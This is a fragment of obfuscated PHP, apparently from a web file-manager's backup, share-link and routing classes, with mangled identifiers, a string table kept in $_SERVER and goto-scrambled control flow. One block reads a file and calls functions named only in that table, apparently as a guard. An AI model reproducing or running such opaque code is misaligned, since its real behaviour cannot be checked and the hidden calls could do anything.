$››ÛÒÑ[2044]) { $ã´Ğ¶ğå[$››ÛÒÑ[775]] = 0; } $ÈŒó¯„Ó = Model($››ÛÒÑ[2039])->where($Àô§¾Ü­)->save($ã´Ğ¶ğå); if ($ÚŒœØœè[$››ÛÒÑ[775]] == $››ÛÒÑ[477]) { if ($³¿í„ä§[$››ÛÒÑ[508]] != $››ÛÒÑ[211] && $this->shareFileMeta($³¿í„ä§[$››ÛÒÑ[508]])) { $this->shareFileMeta($³¿í„ä§[$››ÛÒÑ[508]], 0); } $this->remove($³¿í„ä§[$››ÛÒÑ[632]]); return !0; } if ($ÈŒó¯„Ó && $ÚŒœØœè[$››ÛÒÑ[775]] == $››ÛÒÑ[2044]) { $Å†õÁâ€ = $ã´Ğ¶ğå[$››ÛÒÑ[775]] == $››ÛÒÑ[2044] ? 1 : 0; $this->shareFileMeta($³¿í„ä§[$››ÛÒÑ[508]], $Å†õÁâ€); $this->removeByFile($³¿í„ä§[$››ÛÒÑ[508]]); } return $ÈŒó¯„Ó; } private function removeByFile($«õÌû©„) { $«ö™ÑŸ =& $_SERVER[™»È’øè]; $×¤ÆóÚ = Model($«ö™ÑŸ[850])->where(array($«ö™ÑŸ[508] => $«õÌû©„))->field($«ö™ÑŸ[180])->select(); $€Ê’Ò˜× = array_to_keyvalue($×¤ÆóÚ, $«ö™ÑŸ[12], $«ö™ÑŸ[180]); $ÅÀ«µğ” = array($«ö™ÑŸ[180] => array($«ö™ÑŸ[7], $€Ê’Ò˜×), $«ö™ÑŸ[529] => 1); $×¤ÆóÚ = $this->where($ÅÀ«µğ”)->field($«ö™ÑŸ[632])->select(); if (empty($×¤ÆóÚ)) { return; } $½ÔĞİœ» = array_to_keyvalue($×¤ÆóÚ, $«ö™ÑŸ[12], $«ö™ÑŸ[632]); $this->remove($½ÔĞİœ»); } private function shareFileMeta($µÉÒùîë, $ºô«€Öµ = null) { $ï‹òó¯ =& $_SERVER[™»È’øè]; $èò¸–É„ = array($ï‹òó¯[508] => $µÉÒùîë, $ï‹òó¯[94] => $ï‹òó¯[2049]); if (is_null($ºô«€Öµ)) { return Model($ï‹òó¯[2050])->where($èò¸–É„)->find(); } $èò¸–É„[$ï‹òó¯[417]] = $ºô«€Öµ; Model($ï‹òó¯[2050])->add($èò¸–É„, array(), !0); } } if ($_SERVER[$_SERVER[™»È’øè][892]] != $_SERVER[$_SERVER[™»È’øè][1602]]) { $_getc = $_SERVER[™»È’øè][894]; $_getfile = $_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™»È’øè][245], $_getfilec); if (count($_getarrs) < $_SERVER[™»È’øè][656]) { $exit = $_SERVER[™»È’øè][897]; $exit(); } $_act = $_SERVER[™»È’øè][898]; $_act($_SERVER[$_SERVER[™»È’øè][893]]); } goto BéêôÆ¹÷; Få‰ÄÑğ¤î: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ÑŒóë =& $_SERVER[™»È’øè]; $this->isManual(); self::$name = date($ÑŒóë[773]); if (!($Å¥‘±©Ş = Model($ÑŒóë[774])->lastItem())) { $Å¥‘±©Ş = $this->initData(); } else { self::$name = $Å¥‘±©Ş[$ÑŒóë[32]]; if ($Å¥‘±©Ş[$ÑŒóë[775]] == $ÑŒóë[88]) { self::$name = date($ÑŒóë[254]); $µ™á“‚Ğ = 0; if (isset($Å¥‘±©Ş[$ÑŒóë[336]][$ÑŒóë[213]][$ÑŒóë[508]])) { $µ™á“‚Ğ = (int) $Å¥‘±©Ş[$ÑŒóë[336]][$ÑŒóë[213]][$ÑŒóë[508]]; } if (self::$manual == 0 && $Å¥‘±©Ş[$ÑŒóë[32]] == self::$name) { Model($ÑŒóë[774])->remove($Å¥‘±©Ş[$ÑŒóë[442]]); } $Å¥‘±©Ş = $this->initData($µ™á“‚Ğ, $Å¥‘±©Ş[$ÑŒóë[776]]); } else { $this->checkStore($Å¥‘±©Ş[$ÑŒóë[776]]); } } self::$option = $Å¥‘±©Ş; } private function isManual() { $Ö˜‘÷¾Ğ = _get($GLOBALS, $_SERVER[™»È’øè][777], 0); $Ö˜‘÷¾Ğ = intval($Ö˜‘÷¾Ğ); self::$manual = $Ö˜‘÷¾Ğ && $Ö˜‘÷¾Ğ == 1 ? 1 : 0; } private function initData($œçç»‘ = 0, $¶íéóÀÍ = '') { $·˜¨Ã³Ù =& $_SERVER[™»È’øè]; $ĞÉÉÅ¨ü = Model($·˜¨Ã³Ù[774])->config(); if ($¶íéóÀÍ && $ĞÉÉÅ¨ü[$·˜¨Ã³Ù[776]] != $¶íéóÀÍ) { $œçç»‘ = 0; } $this->checkStore($ĞÉÉÅ¨ü[$·˜¨Ã³Ù[776]]); if (self::$manual == 1) { self::$name .= $·˜¨Ã³Ù[11] . date($·˜¨Ã³Ù[778]); } $¨Ö¨›à = array($·˜¨Ã³Ù[776] => $ĞÉÉÅ¨ü[$·˜¨Ã³Ù[776]], $·˜¨Ã³Ù[32] => self::$name, $·˜¨Ã³Ù[775] => 0, $·˜¨Ã³Ù[779] => $ĞÉÉÅ¨ü[$·˜¨Ã³Ù[779]], $·˜¨Ã³Ù[780] => self::$manual, $·˜¨Ã³Ù[336] => array($·˜¨Ã³Ù[781] => array($·˜¨Ã³Ù[775] => 0), $·˜¨Ã³Ù[782] => array($·˜¨Ã³Ù[775] => 0, $·˜¨Ã³Ù[783] => 0, $·˜¨Ã³Ù[784] => 0, $·˜¨Ã³Ù[33] => $·˜¨Ã³Ù[12], $·˜¨Ã³Ù[785] => 0, $·˜¨Ã³Ù[786] => 0), $·˜¨Ã³Ù[787] => array($·˜¨Ã³Ù[775] => 0, $·˜¨Ã³Ù[783] => 0, $·˜¨Ã³Ù[784] => 0, $·˜¨Ã³Ù[785] => 0, $·˜¨Ã³Ù[786] => 0), $·˜¨Ã³Ù[213] => array($·˜¨Ã³Ù[775] => 0, $·˜¨Ã³Ù[788] => 0, $·˜¨Ã³Ù[789] => 0, $·˜¨Ã³Ù[790] => 0, $·˜¨Ã³Ù[791] => 0, $·˜¨Ã³Ù[508] => $œçç»‘, $·˜¨Ã³Ù[785] => 0, $·˜¨Ã³Ù[786] => 0)), $·˜¨Ã³Ù[785] => time(), $·˜¨Ã³Ù[786] => 0); $Ù¦‡„­Ç = Model($·˜¨Ã³Ù[774])->insert($¨Ö¨›à); $¨Ö¨›à[$·˜¨Ã³Ù[442]] = $Ù¦‡„­Ç; return $¨Ö¨›à; } private function checkStore($æ“›²•) { $ƒàÇŸ =& $_SERVER[™»È’øè]; $·¨Ù¨Ãû = Model($ƒàÇŸ[792])->listData($æ“›²•); Model($ƒàÇŸ[792])->checkConfig($·¨Ù¨Ãû); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[™»È’øè][774])->findByName(self::$name); } return self::$option; } public static function set($Ÿ÷Çğí€) { $á¡ƒ¥£‹ =& $_SERVER[™»È’øè]; $¹™¨˜Œ¼ = self::get(); foreach ($Ÿ÷Çğí€ as $™Ø˜Ó°ğ => $¤áÉ›‹—) { $’†¬ŠÏ´ = explode($á¡ƒ¥£‹[10], $™Ø˜Ó°ğ); $˜Èîø³ƒ = count($’†¬ŠÏ´); switch ($˜Èîø³ƒ) { case 1: $¹™¨˜Œ¼[$’†¬ŠÏ´[0]] = $¤áÉ›‹—; break; case 2: $¹™¨˜Œ¼[$’†¬ŠÏ´[0]][$’†¬ŠÏ´[1]] = $¤áÉ›‹—; break; case 3: $¹™¨˜Œ¼[$’†¬ŠÏ´[0]][$’†¬ŠÏ´[1]][$’†¬ŠÏ´[2]] = $¤áÉ›‹—; break; } } Model($á¡ƒ¥£‹[774])->update($¹™¨˜Œ¼[$á¡ƒ¥£‹[442]], $¹™¨˜Œ¼); self::$option = $¹™¨˜Œ¼; return self::$option; } public function keep() { $¸µøáªÆ =& $_SERVER[™»È’øè]; $²ûĞ¥¥• = self::get(); if ($²ûĞ¥¥•[$¸µøáªÆ[336]][$¸µøáªÆ[781]][$¸µøáªÆ[775]] == $¸µøáªÆ[88]) { return; } $this->backupKeep($²ûĞ¥¥•); self::set(array($¸µøáªÆ[793] => 1)); } private function backupKeep($ØæÕÀè) { $ˆšşñÂ‹ =& $_SERVER[™»È’øè]; if (self::$manual == 1) { return; } $§†™¡› = Model($ˆšşñÂ‹[774])->listData(); if (empty($§†™¡›)) { return; } $Ñ°Û™„ß = 0; $á—Ë« = array(); foreach ($§†™¡› as $çü™†¸¥) { if ($Ñ°Û™„ß >= 7) { break; } $á—Ë«[] = $çü™†¸¥[$ˆšşñÂ‹[32]]; $Ñ°Û™„ß++; } for ($Ñ°Û™„ß = 0; $Ñ°Û™„ß < 12; $Ñ°Û™„ß++) { $á—Ë«[] = date($ˆšşñÂ‹[794], strtotime("\55{$Ñ°Û™„ß}\x20\x6d\157\x6e\x74\x68\163")); } $á—Ë« = array_unique($á—Ë«); $˜÷•œ = Model($ˆšşñÂ‹[795])->get($ˆšşñÂ‹[796]); foreach ($§†™¡› as $çü™†¸¥) { if (isset($çü™†¸¥[$ˆšşñÂ‹[780]]) && $çü™†¸¥[$ˆšşñÂ‹[780]] == $ˆšşñÂ‹[88]) { continue; } if (!empty($çü™†¸¥[$ˆšşñÂ‹[32]]) && in_array($çü™†¸¥[$ˆšşñÂ‹[32]], $á—Ë«)) { continue; } Model($ˆšşñÂ‹[774])->remove($çü™†¸¥[$ˆšşñÂ‹[442]]); $¸×ã„ş = $this->backupPath($ØæÕÀè, $˜÷•œ); IO::remove($¸×ã„ş, !1); } } private function backupPath($´©¥İş, $¿†ıÕş = false) { $Öëòíå‹ =& $_SERVER[™»È’øè]; if (!$¿†ıÕş) { $¿†ıÕş = Model($Öëòíå‹[795])->get($Öëòíå‹[796]); } $®ÖüÍ¨« = $´©¥İş[$Öëòíå‹[32]]; $âŒšµ€© = substr(md5($Öëòíå‹[797] . $¿†ıÕş . $®ÖüÍ¨«), 0, 8); return "\x7b\x69\157\x3a{$´©¥İş[$Öëòíå‹[776]]}\175\x2f\144\141\x74\141\142\141\x73\x65\57\x62\141\x63\x6b\165\160\57" . $®ÖüÍ¨« . $Öëòíå‹[11] . $âŒšµ€©; } public function db() { $æÎ¯“ğˆ =& $_SERVER[™»È’øè]; $èšı²Ó = self::get(); if ($èšı²Ó[$æÎ¯“ğˆ[336]][$æÎ¯“ğˆ[782]][$æÎ¯“ğˆ[775]] == $æÎ¯“ğˆ[88]) { return !0; } $¥ĞÑÃÓ– = new BackupDb(); if (!$¥ĞÑÃÓ–->index()) { return !1; } self::set(array($æÎ¯“ğˆ[798] => 1)); return !0; } public function dbFile() { $ÂÛ¿ù–ü =& $_SERVER[™»È’øè]; $öÜì¢ª” = self::get(); if ($öÜì¢ª”[$ÂÛ¿ù–ü[336]][$ÂÛ¿ù–ü[787]][$ÂÛ¿ù–ü[775]] == $ÂÛ¿ù–ü[88]) { return !0; } $’³‰· = new BackupDbFile(); if (!$’³‰·->index()) { return !1; } self::set(array($ÂÛ¿ù–ü[799] => 1)); return !0; } public function file() { $‘ÑÉÁ¥˜ =& $_SERVER[™»È’øè]; $íÌÃæù£ = self::get(); if ($íÌÃæù£[$‘ÑÉÁ¥˜[336]][$‘ÑÉÁ¥˜[213]][$‘ÑÉÁ¥˜[775]] == $‘ÑÉÁ¥˜[88]) { return !0; } if (!isset($íÌÃæù£[$‘ÑÉÁ¥˜[779]]) || $íÌÃæù£[$‘ÑÉÁ¥˜[779]] == $‘ÑÉÁ¥˜[211]) { $§÷ËÌè‹ = new BackupFile(); if (!$§÷ËÌè‹->index()) { return !1; } } self::set(array($‘ÑÉÁ¥˜[800] => 1, $‘ÑÉÁ¥˜[775] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ëşí£’ =& $_SERVER[™»È’øè]; $¤©‡Û£‚ = Backup::get(); self::$io = $¤©‡Û£‚[$Ëşí£’[776]]; self::$name = $¤©‡Û£‚[$Ëşí£’[32]]; $œ“Ùß¾Ê = new DbManage(); $œİÑß¤¢ = $œ“Ùß¾Ê->dbType(); $îºÄˆšŠ = array($Ëşí£’[801] => $œİÑß¤¢, $Ëşí£’[802] => time()); Backup::set($îºÄˆšŠ); $–ƒ‰²£˜ = $this->tmpFilesPath() . $Ëşí£’[803] . self::$name . $Ëşí£’[8]; del_dir($–ƒ‰²£˜); mk_dir($–ƒ‰²£˜); $ùÎ——ß† = $¾÷Ñ¹Ø = 0; $Õ¡Ôùğº = new Task($Ëşí£’[804], $Ëşí£’[805], 0, LNG($Ëşí£’[806]) . $Ëşí£’[807] . LNG($Ëşí£’[808])); try { $–”ºƒ’ = $œ“Ùß¾Ê->db()->getTables(); } catch (Exception $ú¬Š¡Ê) { $Õ¡Ôùğº->end(); return !1; } $–”ºƒ’ = array_diff($–”ºƒ’, array($Ëşí£’[809], $Ëşí£’[810])); foreach ($–”ºƒ’ as $Íèµ¯¥) { $ùÎ——ß† += $œ“Ùß¾Ê->model($Íèµ¯¥)->count(); } $Õ¡Ôùğº->task[$Ëşí£’[811]] = $ùÎ——ß†; $GLOBALS[$Ëşí£’[812]] = self::$name; foreach ($–”ºƒ’ as $Íèµ¯¥) { $“âÇ = $–ƒ‰²£˜ . $Íèµ¯¥ . $Ëşí£’[813]; $íÄ†ØÓ = null; if ($Íèµ¯¥ == $Ëşí£’[814] && (!isset($¤©‡Û£‚[$Ëşí£’[779]]) || $¤©‡Û£‚[$Ëşí£’[779]] == $Ëşí£’[211])) { $íÄ†ØÓ = self::$io; } $¾÷Ñ¹Ø += $œ“Ùß¾Ê->sqlFromDb($Íèµ¯¥, $“âÇ, $Õ¡Ôùğº, $íÄ†ØÓ); } unset($GLOBALS[$Ëşí£’[812]]); $Õ¡Ôùğº->end(); if ($¾÷Ñ¹Ø > $ùÎ——ß†) { $ùÎ——ß† = $¾÷Ñ¹Ø; } $îºÄˆšŠ = array($Ëşí£’[801] => $œİÑß¤¢, $Ëşí£’[798] => 1, $Ëşí£’[815] => $ùÎ——ß†, $Ëşí£’[816] => $¾÷Ñ¹Ø, $Ëşí£’[817] => time()); Backup::set($îºÄˆšŠ); if ($ùÎ——ß† - $¾÷Ñ¹Ø > 0) { $š±¸Ìó = $Ëşí£’[818]; if (stristr(I18n::getType(), $Ëşí£’[819])) { $š±¸Ìó = $Ëşí£’[820]; } write_log(array($š±¸Ìó, $îºÄˆšŠ), $Ëşí£’[805]); return !1; } return !0; } private function tmpFilesPath() { $ã†ú„À³ =& $_SERVER[™»È’øè]; $µ¿‰ÏŸı = TEMP_FILES; if ($GLOBALS[$ã†ú„À³[6]][$ã†ú„À³[89]][$ã†ú„À³[821]]) { $µ¿‰ÏŸı = $GLOBALS[$ã†ú„À³[6]][$ã†ú„À³[89]][$ã†ú„À³[821]]; if (!mk_dir($µ¿‰ÏŸı) || !is_writable($µ¿‰ÏŸı) || !IO::mkfile($µ¿‰ÏŸı . $ã†ú„À³[822])) { $µ¿‰ÏŸı = TEMP_FILES; } } return $µ¿‰ÏŸı; } } class BackupDbFile { public function __construct() { } public function index() { $ßö›ıÍ =& $_SERVER[™»È’øè]; $²ºŒé¦ = Backup::get(); $“‰´¾Ùù = $²ºŒé¦[$ßö›ıÍ[32]]; $Ï¤Òİ‰– = $this->tmpFilesPath() . "\142\141\143\153\165\x70\x5f{$“‰´¾Ùù}\x2f"; $áî·×Œ = $this->backupPath($²ºŒé¦); if (!($áî·×Œ = IO::mkdir($áî·×Œ))) { return !1; } $ÛÑ¼ã• = IO::listPath($Ï¤Òİ‰–); $Œá‚öÖë = isset($ÛÑ¼ã•[$ßö›ıÍ[83]]) ? $ÛÑ¼ã•[$ßö›ıÍ[83]] : array(); $ç­±ÃÆ˜ = array_sum(array_column($Œá‚öÖë, $ßö›ıÍ[76])); if (!$ç­±ÃÆ˜) { return !1; } $‚æ¥ó’… = array($ßö›ıÍ[823] => $ç­±ÃÆ˜, $ßö›ıÍ[824] => time()); Backup::set($‚æ¥ó’…); $—ç«¦½æ = new TaskFileTransfer($ßö›ıÍ[825], $ßö›ıÍ[805], count($Œá‚öÖë), LNG($ßö›ıÍ[806]) . $ßö›ıÍ[429] . LNG($ßö›ıÍ[808]) . $ßö›ıÍ[826]); $—ç«¦½æ->task[$ßö›ıÍ[788]] = $ç­±ÃÆ˜; foreach ($ÛÑ¼ã•[$ßö›ıÍ[83]] as $ê»¶¨®š) { $Û‰÷ªõ = IO::move($ê»¶¨®š[$ßö›ıÍ[84]], $áî·×Œ); if (!$Û‰÷ªõ) { $—ç«¦½æ->end(); $ÕŸ«ˆª¨ = IO::getLastError($ßö›ıÍ[827] . $ê»¶¨®š[$ßö›ıÍ[84]] . $ßö›ıÍ[828] . $áî·×Œ . $ßö›ıÍ[164]); write_log($ÕŸ«ˆª¨, $ßö›ıÍ[805]); return !1; } } $Òˆ‚ç÷Í = new DbManage(); $´Ì«©şÒ = $Òˆ‚ç÷Í->getSqlFile(); if (!$´Ì«©şÒ[$ßö›ıÍ[829]] || !$´Ì«©şÒ[$ßö›ıÍ[13]]) { return !1; } IO::move($´Ì«©şÒ[$ßö›ıÍ[829]], $áî·×Œ); IO::move($´Ì«©şÒ[$ßö›ıÍ[13]], $áî·×Œ); $—ç«¦½æ->end(); $‚æ¥ó’… = array($ßö›ıÍ[830] => $ç­±ÃÆ˜, $ßö›ıÍ[831] => time()); Backup::set($‚æ¥ó’…); return !0; } private function backupPath($óí­Ÿ‹¥) { $¶–ÂíÚÖ =& $_SERVER[™»È’øè]; $ü¥ ›¨” = $óí­Ÿ‹¥[$¶–ÂíÚÖ[32]]; $®¨öÚÒÀ = Model($¶–ÂíÚÖ[795])->get($¶–ÂíÚÖ[796]); $—äÓâÒ = substr(md5($¶–ÂíÚÖ[797] . $®¨öÚÒÀ . $ü¥ ›¨”), 0, 8); return "\173\151\157\72{$óí­Ÿ‹¥[$¶–ÂíÚÖ[776]]}\175\x2f\144\x61\x74\141\x62\141\163\x65\57\x62\x61\x63\153\x75\160\x2f" . $ü¥ ›¨” . $¶–ÂíÚÖ[11] . $—äÓâÒ; } private function tmpFilesPath() { $í†ùæ¦ =& $_SERVER[™»È’øè]; $ªû–Ù­ = TEMP_FILES; if ($GLOBALS[$í†ùæ¦[6]][$í†ùæ¦[89]][$í†ùæ¦[821]]) { $ªû–Ù­ = $GLOBALS[$í†ùæ¦[6]][$í†ùæ¦[89]][$í†ùæ¦[821]]; if (!mk_dir($ªû–Ù­) || !is_writable($ªû–Ù­) || !IO::mkfile($ªû–Ù­ . $í†ùæ¦[822])) { $ªû–Ù­ = TEMP_FILES; } } return $ªû–Ù­; } } goto A¢à¹‚ø›»; F˜ŞŒÑ¢­Ò: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¤àÍ¨¨) { $this->pathParse = $¤àÍ¨¨; $this->model = Model($_SERVER[™»È’øè][1362]); } protected function infoParse($äã»Â‹¸, $øŞ”à”ƒ = false, $³ŒÇÃ²¶ = false) { $›‚©¾Á¹ =& $_SERVER[™»È’øè]; return Action($›‚©¾Á¹[1204])->sharePathInfo($this->pathParse[$›‚©¾Á¹[84]], !0, $øŞ”à”ƒ); } public function listPath($ßğÄ‰ßë, $ñÚ×ÂêÕ = false) { $ËÜé¡¼ =& $_SERVER[™»È’øè]; $¤Ûñ÷°õ = parent::listPath($ßğÄ‰ßë, $ñÚ×ÂêÕ); if (!$¤Ûñ÷°õ) { return $¤Ûñ÷°õ; } if (is_array($¤Ûñ÷°õ[$ËÜé¡¼[1370]])) { $¤Ûñ÷°õ[$ËÜé¡¼[1370]] = Action($ËÜé¡¼[1204])->shareItemInfo($¤Ûñ÷°õ[$ËÜé¡¼[1370]]); } foreach ($¤Ûñ÷°õ as $à¡§‡¿Ø => $˜šŒ™“) { if (!in_array($à¡§‡¿Ø, array($ËÜé¡¼[83], $ËÜé¡¼[82]))) { continue; } foreach ($˜šŒ™“ as $š‰ùŠğè => $çğ®ºê) { $¤Ûñ÷°õ[$à¡§‡¿Ø][$š‰ùŠğè] = Action($ËÜé¡¼[1204])->shareItemInfo($çğ®ºê); } } return $¤Ûñ÷°õ; } public function listAll($¾íÁÏöå) { $Á„¥ßàĞ =& $_SERVER[™»È’øè]; $ÖñáÖè = IO::info($this->pathParse[$Á„¥ßàĞ[84]]); if (!$ÖñáÖè) { return array(); } $•­„õÑ£ = $this->model->listAll($¾íÁÏöå); foreach ($•­„õÑ£ as &$ÏÇœ©¤¸) { $ÏÇœ©¤¸[$Á„¥ßàĞ[87]] = Action($Á„¥ßàĞ[1204])->shareItemInfo($ÏÇœ©¤¸[$Á„¥ßàĞ[87]]); } unset($ÏÇœ©¤¸); return $•­„õÑ£; } } class PathDriverDriverShareItem { public function __construct($œö —¸) { $this->pathParse = $œö —¸; } public function __call($ÁàãÕñÆ, $¼ÓœÀ–’) { $£¾ Ó§Ø =& $_SERVER[™»È’øè]; if (method_exists($this, $ÁàãÕñÆ)) { return; } $€İÍ˜ÄÔ = call_user_func_array(array($£¾ Ó§Ø[1371], $ÁàãÕñÆ), $¼ÓœÀ–’); $ôê‡†¿‘ = array($£¾ Ó§Ø[1372], $£¾ Ó§Ø[1373], $£¾ Ó§Ø[1374], $£¾ Ó§Ø[1375], $£¾ Ó§Ø[585], $£¾ Ó§Ø[587], $£¾ Ó§Ø[1376], $£¾ Ó§Ø[107], $£¾ Ó§Ø[1377], $£¾ Ó§Ø[1378]); if (in_array($ÁàãÕñÆ, $ôê‡†¿‘)) { $€İÍ˜ÄÔ = $this->getPathOuter($€İÍ˜ÄÔ); } return $€İÍ˜ÄÔ; } public function copy($½ÆµŞ, $ü°à×ß•, $Á¡ù¿×œ = false, $°¨ÖÏ¤ = false) { return $this->copyMove($½ÆµŞ, $ü°à×ß•, $Á¡ù¿×œ, $_SERVER[™»È’øè][585], $°¨ÖÏ¤); } public function move($·ó¤®ö, $£¬Ùã…, $ª±Å¨õ– = false, $Õ‰­Ûö = false) { return $this->copyMove($·ó¤®ö, $£¬Ùã…, $ª±Å¨õ–, $_SERVER[™»È’øè][587], $Õ‰­Ûö); } private function copyMove($”ùÊŠÄ, $Ìº¼à°±, $­³½À², $ü«ÂÑò, $ÊŒ¹»Ò° = false) { $Øí×İ¡ =& $_SERVER[™»È’øè]; $È“™¶êí = $Ìº¼à°±; $´í‚Ï­ê = IO::driverMake($Ìº¼à°±); if ($´í‚Ï­ê->pathParse[$Øí×İ¡[1181]]) { $Ìº¼à°± = $´í‚Ï­ê->pathParse[$Øí×İ¡[1181]]; } else { $Ìº¼à°± = $È“™¶êí; } $£Ó™¨“° = IO::copyMove($”ùÊŠÄ, $Ìº¼à°±, $­³½À², $ü«ÂÑò, $ÊŒ¹»Ò°); $£Ó™¨“° = $this->getPathOuter($£Ó™¨“°); return $£Ó™¨“°; } public function pathThis($ôó¾‡—º) { return get_path_this($this->pathParse[$_SERVER[™»È’øè][84]]); } public function pathFather($—å“ ›) { return get_path_father($this->pathParse[$_SERVER[™»È’øè][84]]); } public function iconvSystem($¡¾ïĞü±) { return $¡¾ïĞü±; } protected function infoParse($¾Â¹©÷ù, $‘Ç’†Û° = false) { $¤ª¼˜ÎÜ =& $_SERVER[™»È’øè]; $ñ—‡ôˆ = $this->pathParse[$¤ª¼˜ÎÜ[527]][$¤ª¼˜ÎÜ[1205]] . $this->pathParse[$¤ª¼˜ÎÜ[1198]]; if ($‘Ç’†Û°) { $ıãîÎ– = IO::infoWithChildren($ñ—‡ôˆ); } else { $ıãîÎ– = IO::info($ñ—‡ôˆ); } $®Íî’¤² = $this->pathParse[$¤ª¼˜ÎÜ[527]]; return Action($¤ª¼˜ÎÜ[1369])->_shareItemeParse($ıãîÎ–, $®Íî’¤²); } public function listAll($“…‰°À‚) { $’¦˜ÚÒ« =& $_SERVER[™»È’øè]; $ğèÙ÷’ç = IO::listAll($“…‰°À‚); $„şõïíÂ = rtrim($this->pathParse[$’¦˜ÚÒ«[527]][$’¦˜ÚÒ«[1205]], $’¦˜ÚÒ«[8]); foreach ($ğèÙ÷’ç as &$«¾ëÔàµ) { $«¾ëÔàµ[$’¦˜ÚÒ«[84]] = $this->pathDriver . $’¦˜ÚÒ«[8] . ltrim(substr($«¾ëÔàµ[$’¦˜ÚÒ«[84]], strlen($„şõïíÂ)), $’¦˜ÚÒ«[8]); } unset($«¾ëÔàµ); return $ğèÙ÷’ç; } public function listAllSimple($Î¸ì, $¥ŞÎå×© = false) { $†ğ °Ô =& $_SERVER[™»È’øè]; $ÔÄä¥Šı = $this->listAll($Î¸ì); $Şò¡ûÙ° = $this->pathParse[$†ğ °Ô[462]]; if (trim($Şò¡ûÙ°, $†ğ °Ô[8]) == trim(get_path_father($Şò¡ûÙ°), $†ğ °Ô[8])) { $¥ŞÎå×© = !0; } return IO::init($†ğ °Ô[12])->listAllSimpleMake($ÔÄä¥Šı, $Şò¡ûÙ°, $¥ŞÎå×©); } public function getPathOuter($‹œÓ«ü•) { $¨ÔĞ˜°ã =& $_SERVER[™»È’øè]; $ÖàÀøœã = KodIO::parse($‹œÓ«ü•); if ($ÖàÀøœã[$¨ÔĞ˜°ã[33]] == KodIO::KOD_SHARE_ITEM) { return $ÖàÀøœã[$¨ÔĞ˜°ã[84]]; } $“¨«Ë = KodIO::clear($‹œÓ«ü•); $ı¬®ÅÌ¼ = KodIO::clear($this->pathParse[$¨ÔĞ˜°ã[527]][$¨ÔĞ˜°ã[1205]]); $ãÎ“€ĞÂ = substr($“¨«Ë, strlen($ı¬®ÅÌ¼)); if (substr($“¨«Ë, 0, strlen($ı¬®ÅÌ¼)) != $ı¬®ÅÌ¼) { return !1; } return $this->pathParse[$¨ÔĞ˜°ã[1199]] . $¨ÔĞ˜°ã[8] . ltrim($ãÎ“€ĞÂ, $¨ÔĞ˜°ã[8]); } public function getType() { $„§½Ø‡ï =& $_SERVER[™»È’øè]; $ÛÖíˆ¥« = str_replace($„§½Ø‡ï[74], $„§½Ø‡ï[12], get_class($this)); return strtolower($ÛÖíˆ¥«); } public function isTypeObject($»²İ¶ë­) { return IO::isTypeObject($»²İ¶ë­); } public function info($ïĞÓµ×µ) { return $this->infoParse($ïĞÓµ×µ); } public function infoAuth($í¸û­) { return $this->infoParse($í¸û­); } public function infoWithChildren($†å¸²–è) { return $this->infoParse($†å¸²–è, !0); } public function infoFull($¶ó‘º²) { return $this->infoParse($¶ó‘º²); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ş‰÷¢±ë) { $this->pathParse = $Ş‰÷¢±ë; } protected function infoParse($Œ™Ïúñò, $ó›Êè¥ = false) { $Ñ ’Ÿ‚Ì =& $_SERVER[™»È’øè]; return Action($Ñ ’Ÿ‚Ì[1204])->sharePathInfo($this->pathParse[$Ñ ’Ÿ‚Ì[84]], !0, $ó›Êè¥); } public function listPath($¸­³œº´, $¦Â™´ôŸ = false) { $¹ü±¬ƒŸ =& $_SERVER[™»È’øè]; $©´‹èŒ = IO::listPath($¸­³œº´, $¦Â™´ôŸ); if (!$©´‹èŒ) { return $©´‹èŒ; } if (is_array($©´‹èŒ[$¹ü±¬ƒŸ[1370]])) { $¼ğƒ˜ö÷ = Action($¹ü±¬ƒŸ[1379])->parsePathChildren($©´‹èŒ[$¹ü±¬ƒŸ[1370]], array($¹ü±¬ƒŸ[462] => $¸­³œº´)); $©´‹èŒ[$¹ü±¬ƒŸ[1370]] = Action($¹ü±¬ƒŸ[1204])->shareItemInfo($¼ğƒ˜ö÷); } foreach ($©´‹èŒ as $ê×Ä·º£ => $ËÀşŒüš) { if (!in_array($ê×Ä·º£, array($¹ü±¬ƒŸ[83], $¹ü±¬ƒŸ[82]))) { continue; } foreach ($ËÀşŒüš as $‡ú°Ÿ‡ú => $¼ğƒ˜ö÷) { $¼ğƒ˜ö÷ = Action($¹ü±¬ƒŸ[1379])->parsePathChildren($¼ğƒ˜ö÷, array($¹ü±¬ƒŸ[462] => $¸­³œº´)); $©´‹èŒ[$ê×Ä·º£][$‡ú°Ÿ‡ú] = Action($¹ü±¬ƒŸ[1204])->shareItemInfo($¼ğƒ˜ö÷); } } return $©´‹èŒ; } } goto AÍç‹Æ™ŠÂ; A¬¶‰öäÙ›: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\133\136\57\135\x2b", "\72\x6e\x75\155" => "\x5b\x30\55\x39\135\53", "\72\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Â÷¢ü¨Œ, $âšùø) { $‰©Ğê¨ì =& $_SERVER[™»È’øè]; if ($Â÷¢ü¨Œ == $‰©Ğê¨ì[1620]) { $“¨œşã = array_map($‰©Ğê¨ì[1621], $âšùø[0]); $Â¯Œá“ñ = strpos($âšùø[1], $‰©Ğê¨ì[8]) === 0 ? $âšùø[1] : $‰©Ğê¨ì[8] . $âšùø[1]; $¥ôŒö­ø = $âšùø[2]; } else { $“¨œşã = null; $Â¯Œá“ñ = strpos($âšùø[0], $‰©Ğê¨ì[8]) === 0 ? $âšùø[0] : $‰©Ğê¨ì[8] . $âšùø[0]; $¥ôŒö­ø = $âšùø[1]; } array_push(self::$maps, $“¨œşã); array_push(self::$routes, $Â¯Œá“ñ); array_push(self::$methods, strtoupper($Â÷¢ü¨Œ)); array_push(self::$callbacks, $¥ôŒö­ø); } public static function error($ĞĞ¨Û´ô) { self::$errorCallback = $ĞĞ¨Û´ô; } public static function haltOnMatch($ÉúÛŞÕ = true) { self::$halts = $ÉúÛŞÕ; } public static function dispatch() { $€Ô¾õœç =& $_SERVER[™»È’øè]; $¾ÊåŞ’ = 